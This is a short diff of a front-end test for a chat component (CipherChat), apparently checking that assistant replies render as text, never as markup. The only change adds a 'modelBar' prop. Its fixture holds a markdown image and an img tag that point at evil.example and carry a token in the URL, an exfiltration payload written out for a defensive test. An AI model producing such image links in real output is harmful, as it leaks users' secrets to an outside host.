@@ -93,7 +93,7 @@ describe('a reply is shown as text, never as markup', () => {
     const evil = '![x](https://evil.example/?d=[redacted-token-1]) <img src="https://evil.example/">';
     const tree = CipherChat({
       entries: [{ role: 'assistant', text: evil } as never], streaming: evil, busy: false,
-      missionTitle: null, onAsk: () => {}, onAbort: () => {}, onReset: () => {},
+      missionTitle: null, onAsk: () => {}, onAbort: () => {}, onReset: () => {}, modelBar: null,
     });
     const types: string[] = [];
     const texts: unknown[] = [];
